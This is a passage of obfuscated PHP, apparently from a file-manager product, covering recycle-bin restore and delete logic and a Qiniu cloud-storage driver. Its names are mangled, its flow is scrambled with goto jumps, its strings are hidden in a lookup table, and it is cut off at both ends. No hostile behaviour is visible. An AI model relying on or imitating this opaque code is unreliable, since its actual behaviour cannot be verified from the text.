$this->add($DèÏŞ°æÎ‘); goto C‰ŞùùôÊÅ; D†¯ˆÚ“›Í: } public function clear() { $this->remove(!1); } public function remove($f¸ºò‰šŒ° = false) { goto dêœØÁİÀÃ; dêœØÁİÀÃ: $E¬ôÅµêŠ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c‡ñù‚ÅŠ¶ = Model($E¬ôÅµêŠ[1102]); $d‹ÑÇÏ‘ƒ = $this->listData(); goto aĞ±‹ÄÙÃ; aĞ±‹ÄÙÃ: $f¸ºò‰šŒ° = $f¸ºò‰šŒ° === !1 ? !1 : $f¸ºò‰šŒ°; $cªŠóÒáæ¨ = array(); foreach ($d‹ÑÇÏ‘ƒ as $a¦Èå›†©¯) { if ($f¸ºò‰šŒ° != !1 && !in_array($a¦Èå›†©¯, $f¸ºò‰šŒ°)) { continue; } $c‡ñù‚ÅŠ¶->remove($a¦Èå›†©¯, !1); $D±êàê°Ñ = $this->where(array($E¬ôÅµêŠ[366] => $a¦Èå›†©¯))->find(); $Cˆä†òìÓ = $D±êàê°Ñ[$E¬ôÅµêŠ[368]] . $E¬ôÅµêŠ[70] . $D±êàê°Ñ[$E¬ôÅµêŠ[452]]; $cªŠóÒáæ¨[$Cˆä†òìÓ] = array($E¬ôÅµêŠ[517] => $D±êàê°Ñ[$E¬ôÅµêŠ[368]], $E¬ôÅµêŠ[452] => $D±êàê°Ñ[$E¬ôÅµêŠ[452]]); $this->where(array($E¬ôÅµêŠ[366] => $a¦Èå›†©¯))->delete(); } goto E¶š°ŠÜÍ¢; E¶š°ŠÜÍ¢: foreach ($cªŠóÒáæ¨ as $BŠ¹†íô˜) { $c‡ñù‚ÅŠ¶->targetSpaceUpdate($BŠ¹†íô˜[$E¬ôÅµêŠ[368]], $BŠ¹†íô˜[$E¬ôÅµêŠ[452]]); } goto fÎÍ¡ƒ–óˆ; fÎÍ¡ƒ–óˆ: } public function restore($dÅÂ›°îïÍ = false) { goto E“ÜìÍ±øÒ; E“ÜìÍ±øÒ: $eŒæâ‘º„ó =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d…¡¶Æçƒ = Model($eŒæâ‘º„ó[1102]); $b”Şò…£ê = $this->listData(); goto c‹Ğ é¯‡­; b“˜†´äË: foreach ($b”Şò…£ê as $B¾ÌğÆÙÄ) { goto Eáš†²í“…; AÕùîá…èÛ: $DÑ …ÙØ[] = $Eè£ƒÏÚÕ[$eŒæâ‘º„ó[457]]; if ($Eè£ƒÏÚÕ[$eŒæâ‘º„ó[367]] == $eŒæâ‘º„ó[83]) { $DÑ …ÙØ[] = $B¾ÌğÆÙÄ; } $d…¡¶Æçƒ->lockMoveEnd($B¾ÌğÆÙÄ); goto B„·¤Œ—’; c›÷Şî¤¼Ã: if ($Eè£ƒÏÚÕ[$eŒæâ‘º„ó[367]] == $eŒæâ‘º„ó[83]) { $Dç –ñÎò = array($eŒæâ‘º„ó[521] => array($eŒæâ‘º„ó[479], $Eè£ƒÏÚÕ[$eŒæâ‘º„ó[455]] . $B¾ÌğÆÙÄ . $eŒæâ‘º„ó[480])); $d…¡¶Æçƒ->where($Dç –ñÎò)->setField($eŒæâ‘º„ó[393], 0); } $this->where(array($eŒæâ‘º„ó[366] => $B¾ÌğÆÙÄ))->delete(); $d…¡¶Æçƒ->folderSizeReset($Eè£ƒÏÚÕ[$eŒæâ‘º„ó[457]]); goto AÕùîá…èÛ; Eáš†²í“…: if ($dÅÂ›°îïÍ != !1 && !in_array($B¾ÌğÆÙÄ, $dÅÂ›°îïÍ)) { continue; } $Eè£ƒÏÚÕ = $d…¡¶Æçƒ->sourceInfo($B¾ÌğÆÙÄ); $d„è¬’´êˆ = $d…¡¶Æçƒ->sourceInfo($Eè£ƒÏÚÕ[$eŒæâ‘º„ó[457]]); goto D‘µô½„»»; D‘µô½„»»: if ($d„è¬’´êˆ[$eŒæâ‘º„ó[393]] == $eŒæâ‘º„ó[83]) { continue; } $d…¡¶Æçƒ->lockMoveStart($B¾ÌğÆÙÄ); $this->recycleMove($B¾ÌğÆÙÄ, 0); goto c›÷Şî¤¼Ã; B„·¤Œ—’: } $d…¡¶Æçƒ->updateModifyTime($DÑ …ÙØ); goto d©—‰¸ôÎÊ; c‹Ğ é¯‡­: $dÅÂ›°îïÍ = $dÅÂ›°îïÍ == !1 ? !1 : $dÅÂ›°îïÍ; if (!$b”Şò…£ê) { return !0; } $DÑ …ÙØ = array(); goto b“˜†´äË; d©—‰¸ôÎÊ: } private function recycleMove($eÖå²ì·ó•, $D¸†›ˆ‘İƒ = 1) { $BÆ·ÅšÔá– =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BÜİ÷¢ÆÎ = Model($BÆ·ÅšÔá–[1102]); $E¥ ¥®ˆò‘ = Model($BÆ·ÅšÔá–[2320]); $aÁÉßöŸ›À = array($BÆ·ÅšÔá–[366] => $eÖå²ì·ó•); if ($D¸†›ˆ‘İƒ) { $BÜİ÷¢ÆÎ->where($aÁÉßöŸ›À)->setField($BÆ·ÅšÔá–[393], 1); $E¥ ¥®ˆò‘->eventRecycle($eÖå²ì·ó•, $BÆ·ÅšÔá–[2321]); } else { $EŞ¶—ùµá¿ = $BÜİ÷¢ÆÎ->where($aÁÉßöŸ›À)->find(); $B Óï”’… = $EŞ¶—ùµá¿[$BÆ·ÅšÔá–[367]] == $BÆ·ÅšÔá–[83]; $f¼Œ–¿íÔô = $BÜİ÷¢ÆÎ->fileNameAuto($EŞ¶—ùµá¿[$BÆ·ÅšÔá–[457]], $EŞ¶—ùµá¿[$BÆ·ÅšÔá–[28]], REPEAT_RENAME_FOLDER, $B Óï”’…); if ($f¼Œ–¿íÔô != $EŞ¶—ùµá¿[$BÆ·ÅšÔá–[28]]) { $BÜİ÷¢ÆÎ->rename($eÖå²ì·ó•, $f¼Œ–¿íÔô); } $BÜİ÷¢ÆÎ->where($aÁÉßöŸ›À)->setField($BÆ·ÅšÔá–[393], 0); $E¥ ¥®ˆò‘->eventRecycle($eÖå²ì·ó•, $BÆ·ÅšÔá–[2322]); } } } goto eÜ‰‘í£Ó¶; FµñÔÒ§Ôˆ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($cÀ±çˆê) { parent::__construct(); require_once SDK_DIR . $_SERVER[ÚŠ•´ÍéÒÑÔ][1199]; $this->_init($cÀ±çˆê); } public function _init($aÙàÕè±„°) { foreach ($aÙàÕè±„° as $f¶¬†™‘öÏ => $CƒæÀÆìÅ) { if (isset($this->{$f¶¬†™‘öÏ})) { $this->{$f¶¬†™‘öÏ} = $CƒæÀÆìÅ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[ÚŠ•´ÍéÒÑÔ][1200], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($cñÊ–ïø¤‘, $FÈÙÒÛŒíº = '', $däƒŠ—‹Æ¦ = REPEAT_RENAME) { if ($this->setContent($cñÊ–ïø¤‘, $FÈÙÒÛŒíº)) { return $this->getPathOuter($cñÊ–ïø¤‘); } return !1; } public function mkdir($c‘Â±Û…£, $fàß…¹ßÔ· = REPEAT_SKIP) { goto a´âà÷ÉÅ; a´âà÷ÉÅ: $AíµÁĞ àÛ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FÔ•ì¯²‰ˆ = trim($c‘Â±Û…£, $AíµÁĞ àÛ[8]); if ($this->_isFolder($FÔ•ì¯²‰ˆ)) { return $this->getPathOuter($FÔ•ì¯²‰ˆ); } goto d¸Ø…„Şí; D»õİ ¸¹Â: if (!$this->mkfile($e·¡ÁÖÑ÷ö)) { return !1; } if (!$this->moveFile($e·¡ÁÖÑ÷ö, $c‘Â±Û…£)) { $this->delFile($e·¡ÁÖÑ÷ö); return !1; } return $this->getPathOuter($FÔ•ì¯²‰ˆ); goto BäÅïÄİ‰; d¸Ø…„Şí: $c‘Â±Û…£ = $FÔ•ì¯²‰ˆ . $AíµÁĞ àÛ[8]; $eÈ•ÂÄƒ—— = get_path_this($FÔ•ì¯²‰ˆ); $e·¡ÁÖÑ÷ö = $c‘Â±Û…£ . $eÈ•ÂÄƒ——; goto D»õİ ¸¹Â; BäÅïÄİ‰: } public function copyFile($d¼› ×…‘Ú, $b«ÔÌÕÃ¥†) { $d¦”Ö¸¾òö = $this->bucketManager->copy($this->bucket, $d¼› ×…‘Ú, $this->bucket, $b«ÔÌÕÃ¥†, !0); return $d¦”Ö¸¾òö ? !1 : !0; } public function moveFile($e‰³æÃ”, $b×‘ä¡íªª) { $bÉ…íŞï” = $this->bucketManager->move($this->bucket, $e‰³æÃ”, $this->bucket, $b×‘ä¡íªª, !0); return $bÉ…íŞï” ? !1 : !0; } public function delFile($aÎÉŞ¶ØÎ) { $EÒßœ‚ÚÊ  = $this->bucketManager->delete($this->bucket, $aÎÉŞ¶ØÎ); return $EÒßœ‚ÚÊ  ? !1 : !0; } public function delFolder($bêôÓÕö†Ô) { $c±–Ïïƒç = $this->fileList($bêôÓÕö†Ô); if (empty($c±–Ïïƒç)) { return !0; } $BÕ¶¤ÉÙÆî = 1000; if (count($c±–Ïïƒç) <= $BÕ¶¤ÉÙÆî) { return $this->qnDelObj($c±–Ïïƒç) ? !1 : !0; } foreach (array_chunk($c±–Ïïƒç, $BÕ¶¤ÉÙÆî) as $FÕÎ§ÏˆËê) { $AË¦ŒªÌË— = $this->qnDelObj($FÕÎ§ÏˆËê); if ($AË¦ŒªÌË—) { return !1; } } return !0; } private function qnDelObj($D««á‡âéÑ) { $Eô¬®ÆÃªÁ = $this->bucketManager->buildBatchDelete($this->bucket, $D««á‡âéÑ); list($EºÏ·äÑö¨, $cÌ¾†‡ƒä) = $this->bucketManager->batch($Eô¬®ÆÃªÁ); return $cÌ¾†‡ƒä; } private function fileList($b…¸ë–‹õ, $dÁËÈÎ¦Ï— = 0) { goto b“Ë— °ëÉ; FÊ íª‚£: $añ‹ˆÂÜóè = array(); while (!0) { list($dé“Š¯¸„Ø, $fìÙ¬“ÇÆ) = $this->bucketManager->listFiles($this->bucket, $c¥”Ôé««„, $fï¹Ğˆôî÷, $BÔ¤ŠŞ¨É•, $E’Ñ©œ©¨Š); if ($fìÙ¬“ÇÆ) { return !1; } $fï¹Ğˆôî÷ = array_key_exists($E°ˆ¼¬ÕŠò[1170], $dé“Š¯¸„Ø) ? $fï¹Ğˆôî÷ = $dé“Š¯¸„Ø[$E°ˆ¼¬ÕŠò[1201]] : $E°ˆ¼¬ÕŠò[33]; foreach ($dé“Š¯¸„Ø[$E°ˆ¼¬ÕŠò[1202]] as $eñµä©õÈ) { $Båœ©­Ÿğ‚ = $eñµä©õÈ[$E°ˆ¼¬ÕŠò[89]]; if ($dÁËÈÎ¦Ï—) { $Båœ©­Ÿğ‚ = array($E°ˆ¼¬ÕŠò[28] => $Båœ©­Ÿğ‚, $E°ˆ¼¬ÕŠò[77] => $eñµä©õÈ[$E°ˆ¼¬ÕŠò[1203]]); } $añ‹ˆÂÜóè[] = $Båœ©­Ÿğ‚; } if ($fï¹Ğˆôî÷ == $E°ˆ¼¬ÕŠò[33]) { break; } } return $añ‹ˆÂÜóè; goto fåñ¢ïî¢; b“Ë— °ëÉ: $E°ˆ¼¬ÕŠò =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b…¸ë–‹õ = trim($b…¸ë–‹õ, $E°ˆ¼¬ÕŠò[8]); $c¥”Ôé««„ = empty($b…¸ë–‹õ) ? $E°ˆ¼¬ÕŠò[33] : $b…¸ë–‹õ . $E°ˆ¼¬ÕŠò[8]; goto AéÑ±Öíùï; AéÑ±Öíùï: $fï¹Ğˆôî÷ = $E°ˆ¼¬ÕŠò[33]; $BÔ¤ŠŞ¨É• = 1000; $E’Ñ©œ©¨Š = $E°ˆ¼¬ÕŠò[33]; goto FÊ íª‚£; fåñ¢ïî¢: } public function rename($d‡ƒ®ªÊœÉ, $Bã·©ÌÉ¯í) { return $this->renameObject($d‡ƒ®ªÊœÉ, $Bã·©ÌÉ¯í); } public function fileInfo($bÍ§Ñ»…–ë, $b¦ÜšŒæ Ğ = false, $eøìÏƒ•° = array()) { goto b¼ÖÅÎ®É; a±‹­¬‡Áª: if (empty($eøìÏƒ•°)) { $eøìÏƒ•° = $this->objectMeta($bÍ§Ñ»…–ë); if (!$eøìÏƒ•°) { return $AëíùĞë÷®; } } if (isset($eøìÏƒ•°[$F¸Ïª·Ï»œ[1204]])) { $AëíùĞë÷®[$F¸Ïª·Ï»œ[184]] = $eøìÏƒ•°[$F¸Ïª·Ï»œ[1204]]; } if (isset($eøìÏƒ•°[$F¸Ïª·Ï»œ[1203]])) { $AëíùĞë÷®[$F¸Ïª·Ï»œ[77]] = $eøìÏƒ•°[$F¸Ïª·Ï»œ[1203]]; } goto fºŞÚˆ‡Û£; fºŞÚˆ‡Û£: return $AëíùĞë÷®; goto E¼ìøŠÌ¨; b¼ÖÅÎ®É: $F¸Ïª·Ï»œ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($b¦ÜšŒæ Ğ) { return array($F¸Ïª·Ï»œ[28] => $this->pathThis($bÍ§Ñ»…–ë), $F¸Ïª·Ï»œ[75] => $this->getPathOuter($F¸Ïª·Ï»œ[8] . $bÍ§Ñ»…–ë), $F¸Ïª·Ï»œ[29] => $F¸Ïª·Ï»œ[164], $F¸Ïª·Ï»œ[77] => isset($eøìÏƒ•°[$F¸Ïª·Ï»œ[1203]]) ? $eøìÏƒ•°[$F¸Ïª·Ï»œ[1203]] : 0, $F¸Ïª·Ï»œ[157] => $this->ext($bÍ§Ñ»…–ë)); } $AëíùĞë÷® = array($F¸Ïª·Ï»œ[28] => $this->pathThis($bÍ§Ñ»…–ë), $F¸Ïª·Ï»œ[75] => $this->getPathOuter($F¸Ïª·Ï»œ[8] . $bÍ§Ñ»…–ë), $F¸Ïª·Ï»œ[29] => $F¸Ïª·Ï»œ[164], $F¸Ïª·Ï»œ[184] => 0, $F¸Ïª·Ï»œ[107] => 0, $F¸Ïª·Ï»œ[77] => 0, $F¸Ïª·Ï»œ[157] => $this->ext($bÍ§Ñ»…–ë), $F¸Ïª·Ï»œ[185] => !0, $F¸Ïª·Ï»œ[186] => !0); goto a±‹­¬‡Áª; E¼ìøŠÌ¨: } public function folderInfo($déÍê ¬ö¶, $D‘’ëóºÃ = false) { goto eÖùìâÚ§; eÖùìâÚ§: $a‡±£õšÏ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($D‘’ëóºÃ) { return array($a‡±£õšÏ[28] => $this->pathThis($déÍê ¬ö¶), $a‡±£õšÏ[75] => $this->getPathOuter($a‡±£õšÏ[8] . $déÍê ¬ö¶), $a‡±£õšÏ[29] => $a‡±£õšÏ[76]); } $d¤‚œÓ×šŸ = array($a‡±£õšÏ[28] => $this->pathThis($déÍê ¬ö¶), $a‡±£õšÏ[75] => $this->getPathOuter($a‡±£õšÏ[8] . $déÍê ¬ö¶), $a‡±£õšÏ[29] => $a‡±£õšÏ[76], $a‡±£õšÏ[184] => 0, $a‡±£õšÏ[107] => 0, $a‡±£õšÏ[1146] => !0, $a‡±£õšÏ[1147] => !0); goto aƒï­ÖâÂ; aƒï­ÖâÂ: $déÍê ¬ö¶ = rtrim($déÍê ¬ö¶, $a‡±£õšÏ[8]) . $a‡±£õšÏ[8]; $B® Î˜¼•Í = $this->objectMeta($déÍê ¬ö¶); if (isset($B® Î˜¼•Í[$a‡±£õšÏ[1204]])) { $d¤‚œÓ×šŸ[$a‡±£õšÏ[184]] = $B® Î˜¼•Í[$a‡±£õšÏ[1204]]; } goto eå†„Óçä‘; eå†„Óçä‘: return $d¤‚œÓ×šŸ; goto d½¾Ëœ´Ó; d½¾Ëœ´Ó: } public function listPath($CÍ¦µ§²­, $BË‘·¾Ë™ = false) { goto fƒ‹Ú ¦à·; fƒ‹Ú ¦à·: $e»’ß‘ì¾ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CÍ¦µ§²­ = trim($CÍ¦µ§²­, $e»’ß‘ì¾[8]); $fõİ—­ÏŸ¬ = empty($CÍ¦µ§²­) ? $e»’ß‘ì¾[33] : $CÍ¦µ§²­ . $e»’ß‘ì¾[8]; goto d›·…Ñáù—; f‹ÁÙŠ: $Ağ¤°ğ¤íÔ = $e‰ßè…ò¾å = array(); while (!0) { list($bïÜõ¹¦Ö‹, $CÄ¢ÛåÅ) = $this->bucketManager->listFiles($this->bucket, $fõİ—­ÏŸ¬, $f‚¸‡†¿ÁÁ, $aâÙ¯ë–, $bÅÄ“š²«¤); if ($CÄ¢ÛåÅ) { return !1; } $f‚¸‡†¿ÁÁ = array_key_exists($e»’ß‘ì¾[1170], $bïÜõ¹¦Ö‹) ? $f‚¸‡†¿ÁÁ = $bïÜõ¹¦Ö‹[$e»’ß‘ì¾[1201]] : $e»’ß‘ì¾[33]; if (isset($bïÜõ¹¦Ö‹[$e»’ß‘ì¾[1205]])) { foreach ($bïÜõ¹¦Ö‹[$e»’ß‘ì¾[1205]] as $a°Ä…ã³Ç) { if ($a°Ä…ã³Ç == $fõİ—­ÏŸ¬) { continue; } $Ağ¤°ğ¤íÔ[] = $this->folderInfo($a°Ä…ã³Ç, $BË‘·¾Ë™); } } if (isset($bïÜõ¹¦Ö‹[$e»’ß‘ì¾[1202]])) { foreach ($bïÜõ¹¦Ö‹[$e»’ß‘ì¾[1202]] as $d–ĞŸÕš¶½) { if ($d–ĞŸÕš¶½[$e»’ß‘ì¾[89]] == $fõİ—­ÏŸ¬) { continue; } $e‰ßè…ò¾å[] = $this->fileInfo($d–ĞŸÕš¶½[$e»’ß‘ì¾[89]], $BË‘·¾Ë™, $d–ĞŸÕš¶½); } } if ($f‚¸‡†¿ÁÁ == $e»’ß‘ì¾[33]) { break; } } return array($e»’ß‘ì¾[74] => $Ağ¤°ğ¤íÔ, $e»’ß‘ì¾[73] => $e‰ßè…ò¾å); goto e‰…Ì’¶É; d›·…Ñáù—: $f‚¸‡†¿ÁÁ = $e»’ß‘ì¾[33]; $aâÙ¯ë– = 1000; $bÅÄ“š²«¤ = $e»’ß‘ì¾[8]; goto f‹ÁÙŠ; e‰…Ì’¶É: } public function has($bšé¢ªßœ‰, $cİÚ¨ôºâ = false, $d¼çëÓ”©è = true) { goto dØÏì¹¦; fóŸä¤ˆ•Ó: if ($cİÚ¨ôºâ) { return array($e”šªğª„[188] => $b¹¸çˆ‚Ã÷, $e”šªğª„[189] => $AÚº™ƒŸƒà); } return !1; goto e¸Ë¥õ™ƒÓ; b²Å‰ÆÙğ¬: $aªøŞ•Ø™¤ = $e”šªğª„[33]; $DÃ¼Â…‡³† = 1000; $B æò¼‹¸– = $e”šªğª„[8]; goto F³âŠôõ„‘; F³âŠôõ„‘: $b¹¸çˆ‚Ã÷ = 0; $AÚº™ƒŸƒà = 0; while (!0) { list($A¼›Ù—«‡ˆ, $F¬ÁÌšãØé) = $this->bucketManager->listFiles($this->bucket, $Bá½Š¦­ôË, $aªøŞ•Ø™¤, $DÃ¼Â…‡³†, $B æò¼‹¸–); if ($F¬ÁÌšãØé) { return !1; } $aªøŞ•Ø™¤ = array_key_exists($e”šªğª„[1170], $A¼›Ù—«‡ˆ) ? $aªøŞ•Ø™¤ = $A¼›Ù—«‡ˆ[$e”šªğª„[1201]] : $e”šªğª„[33]; if ($cİÚ¨ôºâ) { if (!empty($A¼›Ù—«‡ˆ[$e”šªğª„[1202]])) { $b¹¸çˆ‚Ã÷ += count($A¼›Ù—«‡ˆ[$e”šªğª„[1202]]); } if (!empty($A¼›Ù—«‡ˆ[$e”šªğª„[1205]])) { $AÚº™ƒŸƒà += count($A¼›Ù—«‡ˆ[$e”šªğª„[1205]]); } if ($aªøŞ•Ø™¤ === $e”šªğª„[33]) { break; } continue; } if ($d¼çëÓ”©è) { if (!empty($A¼›Ù—«‡ˆ[$e”šªğª„[1202]])) { return !0; } } else { if (!empty($A¼›Ù—«‡ˆ[$e”šªğª„[1205]])) { return !0; } } if ($aªøŞ•Ø™¤ == $e”šªğª„[33]) { break; } } goto fóŸä¤ˆ•Ó; dØÏì¹¦: $e”šªğª„ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bšé¢ªßœ‰ = trim($bšé¢ªßœ‰, $e”šªğª„[8]); $Bá½Š¦­ôË = empty($bšé¢ªßœ‰) ? $e”šªğª„[33] : $bšé¢ªßœ‰ . $e”šªğª„[8]; goto b²Å‰ÆÙğ¬; e¸Ë¥õ™ƒÓ: } public function listAll($FĞ¡¾‚£Ò) { $a¬ß¿´Äº =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D¼Ø…“ã²Ì = $this->fileList($FĞ¡¾‚£Ò, 1); $f«ìÑ…¬ˆ× = array(); foreach ($D¼Ø…“ã²Ì as $e…–§ñôáñ) { $f«ìÑ…¬ˆ×[$e…–§ñôáñ[$a¬ß¿´Äº[28]]] = $e…–§ñôáñ[$a¬ß¿´Äº[77]]; } return $this->listAllFiles($FĞ¡¾‚£Ò, array_keys($f«ìÑ…¬ˆ×), $f«ìÑ…¬ˆ×); } public function canRead($CëÏÃ¼Œå) { return $this->exist($CëÏÃ¼Œå) ? !0 : !1; } public function canWrite($aÄ¿¡¨°²À) { return $this->exist($aÄ¿¡¨°²À) ? !0 : !1; } public function getContent($f’·µçŒ´Ë) { return $this->fileSubstr($f’·µçŒ´Ë, 0, -1); } public function setContent($C²ÕÃ‘ñÎÊ, $dàíšç–ë¤ = '') { $eáöÃàùµ‘ = $this->tempFile($this->pathThis($C²ÕÃ‘ñÎÊ)); file_put_contents($eáöÃàùµ‘, $dàíšç–ë¤); if ($this->upload($C²ÕÃ‘ñÎÊ, $eáöÃàùµ‘)) { $this->tempFileRemve($eáöÃàùµ‘); return !0; } return !1; } public function refreshUrls($c’Ü‘èó‚) { goto EÈë¯‰éÀ; bÃä‡–‚„è: return $f»‚»¨¢Ú¾[$E¨”èÜæ™[1206]] == $E¨”èÜæ™[691] ? !0 : !1; goto a‹¼Îğ«Ê­; EÈë¯‰éÀ: $E¨”èÜæ™ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Càì±¹…»ª = array(); if (is_array($c’Ü‘èó‚)) { foreach ($c’Ü‘èó‚ as $F†šñëŠîô) { $Càì±¹…»ª[] = $this->link($F†šñëŠîô); } } else { $Càì±¹…»ª[] = $this->link($c’Ü‘èó‚); } goto BÏãÃÜÚ‰; BÏãÃÜÚ‰: $C‚ÒöÎä­ = new Qiniu\Cdn\CdnManager($this->auth); list($f»‚»¨¢Ú¾, $B¾«™Ò¸Œñ) = $C‚ÒöÎä­->refreshUrls($Càì±¹…»ª); if ($B¾«™Ò¸Œñ) { return !1; } goto bÃä‡–‚„è; a‹¼Îğ«Ê­: } public function fileSubstr($Có¶É–‡òØ, $BÏì•´ÍÜÚ, $bé¨öÃ†Ñ‰) { $d¨àÄ§ªÖ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!($bîºÅîØ = $this->link($Có¶É–‡òØ))) { return !1; } $bõÚå¸á§‡ = !1; if ($bé¨öÃ†Ñ‰ > 0) { $a‡ÈÔÙ©ßî = $BÏì•´ÍÜÚ + $bé¨öÃ†Ñ‰ - 1; $bõÚå¸á§‡ = array($d¨àÄ§ªÖ[1207] . $BÏì•´ÍÜÚ . $d¨àÄ§ªÖ[408] . $a‡ÈÔÙ©ßî); } $cŸ²Ú—¼ = url_request($bîºÅîØ, $d¨àÄ§ªÖ[213], !1, $bõÚå¸á§‡); return $cŸ²Ú—¼[$d¨àÄ§ªÖ[684]] ? $cŸ²Ú—¼[$d¨àÄ§ªÖ[1026]] : !1; } public function upload($BÂ Óå¡Òé, $cïõœ·§, $bë·¤ªÃ¹ = false, $Fà»‡èİ¿² = REPEAT_REPLACE) { $AæÉéŸˆ = new Qiniu\Storage\UploadManager(); $FÉ—íÒÆ¢ß = $this->auth->uploadToken($this->bucket, $BÂ Óå¡Òé); $e¼îô“¯¦ = get_file_mime(get_path_ext($cïõœ·§)); list($E¼õïâé†§, $eŠ“Æù£) = $AæÉéŸˆ->putFile($FÉ—íÒÆ¢ß, $BÂ Óå¡Òé, $cïõœ·§, null, $e¼îô“¯¦); return $eŠ“Æù£ ? !1 : $this->getPathOuter($BÂ Óå¡Òé); } public function uploadFormData($a‰”¡İ¡Üß, $Có»»†Òæ£ = 3600) { return $this->uploadToken($a‰”¡İ¡Üß, $Có»»†Òæ£); } public function multiUploadFormData($F¼Ã¦„£¹, $A¤®ˆƒ´’ = 3600) { return $this->uploadToken($F¼Ã¦„£¹, $A¤®ˆƒ´’); } private function uploadToken($E¿Æõ‹Ñ•, $D†¥ŠÜ = 3600) { goto D‡‘Œ›¢ÇÈ; c—æ³ä´½„: $FÅ§™¶ó‘ = http_type() . "\x3a\x2f\x2f\165\160\154\157\x61\144{$dæâ êõ¹ï}\x2e\161\151\x6e\151\165\x70\56\143\x6f\x6d\57"; return array($FÂ¦ñ¥‚Ä¸[1211] => $D¥—“ÛÂ–‚, $FÂ¦ñ¥‚Ä¸[1212] => $FÅ§™¶ó‘); goto Aõ¢Ç¶ö«ğ; D‡‘Œ›¢ÇÈ: $FÂ¦ñ¥‚Ä¸ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FñÃš¬‹µ÷ = $D†¥ŠÜ; $eŒ¼¹Û°ˆª = array($FÂ¦ñ¥‚Ä¸[1208] => $FÂ¦ñ¥‚Ä¸[1209]); goto C‚¨Ë–ªîÃ; C‚¨Ë–ªîÃ: $c¥ÆƒÌÈ£ = null; $D¥—“ÛÂ–‚ = $this->auth->uploadToken($this->bucket, $c¥ÆƒÌÈ£, $FñÃš¬‹µ÷, $eŒ¼¹Û°ˆª, !0); $dæâ êõ¹ï = empty($this->region) || $this->region == $FÂ¦ñ¥‚Ä¸[1210] ? $FÂ¦ñ¥‚Ä¸[33] : $FÂ¦ñ¥‚Ä¸[408] . $this->region; goto c—æ³ä´½„; Aõ¢Ç¶ö«ğ: } public function download($CË™îÇÃÁš, $AÍÎšôĞõù) { goto Dç¹àÌ¡à; Dç¹àÌ¡à: $a‡ƒ¸Ù™ï¿ = IO::getPathInner(IO::mkfile($AÍÎšôĞõù)); if (!($dÌ´ª°º£â = $this->link($CË™îÇÃÁš))) { return !1; } $Ağéªƒ£´§ = 0; goto A¾öÍğ´Š; A¾öÍğ´Š: $E‚™…¼ŠË˜ = 1024 * 200; $e¾ùà¯»ŠÓ = fopen($a‡ƒ¸Ù™ï¿, $_SERVER[ÚŠ•´ÍéÒÑÔ][1213]); while (!0) { $Cë®Ï©¯ = $this->fileSubstr($CË™îÇÃÁš, $Ağéªƒ£´§, $E‚™…¼ŠË˜); if ($Cë®Ï©¯ === !1) { return !1; } fwrite($e¾ùà¯»ŠÓ, $Cë®Ï©¯); $Ağéªƒ£´§ += $E‚™…¼ŠË˜; if (strlen($Cë®Ï©¯) < $E‚™…¼ŠË˜) { break; } } goto fí„àíÓÈÑ; fí„àíÓÈÑ: fclose($e¾ùà¯»ŠÓ); return $AÍÎšôĞõù; goto a…Ş‚„°“×; a…Ş‚„°“×: } public function link($fò·Á¡—Ù¾, $e²ÀÍç‹„é = '') { if (!$this->isFile($fò·Á¡—Ù¾)) { return !1; } $EÂğÖ˜ªÊØ = $this->getHost() . $_SERVER[ÚŠ•´ÍéÒÑÔ][8] . $this->pathEncode($fò·Á¡—Ù¾) . $e²ÀÍç‹„é; return $this->auth->privateDownloadUrl($EÂğÖ˜ªÊØ, 3600 * 12); } public function fileOut($cÎªˆòÂÂŸ, $b²’à£ø¦¢ = false, $Aˆ¯ŞªŒ† = false, $bå¦¢½µÚÅ = '') { $aê†êÛˆó‚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$Aˆ¯ŞªŒ†) { $Aˆ¯ŞªŒ† = $this->pathThis($cÎªˆòÂÂŸ); } $eóŒ»ïù = $b²’à£ø¦¢ ? $aê†êÛˆó‚[1214] . rawurlencode($Aˆ¯ŞªŒ†) : $aê†êÛˆó‚[33]; $FËª™ÔÌ¥Œ = $this->link($cÎªˆòÂÂŸ, $eóŒ»ïù); $this->fileOutLink($FËª™ÔÌ¥Œ); } public function fileOutServer($FÓŸ¨Ã•ùà, $bê¯’ˆã¶¸ = false, $BâáŸÀ¤‰ = false, $c®¾­Şˆ‚¯ = '') { parent::fileOut($FÓŸ¨Ã•ùà, $bê¯’ˆã¶¸, $BâáŸÀ¤‰, $c®¾­Şˆ‚¯); } public function fileOutImage($EˆÈß«¸Â•, $B®Å¶ó—… = 250) { $C›ÇŒ–êßÀ = $this->link($EˆÈß«¸Â•, $_SERVER[ÚŠ•´ÍéÒÑÔ][1215] . $B®Å¶ó—…); $this->fileOutLink($C›ÇŒ–êßÀ); } public function fileOutImageServer($C±ïÁ”Ûİ‚, $eÖ¤ªƒ²ò = 250) { parent::fileOutImage($C±ïÁ”Ûİ‚, $eÖ¤ªƒ²ò); } public function hashMd5($E­Ÿ‘ƒÀÙ) { $B‰¯Ú‚ç˜ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A­±ï˜‡Œˆ = $this->objectMeta($E­Ÿ‘ƒÀÙ); return isset($A­±ï˜‡Œˆ[$B‰¯Ú‚ç˜[193]]) ? 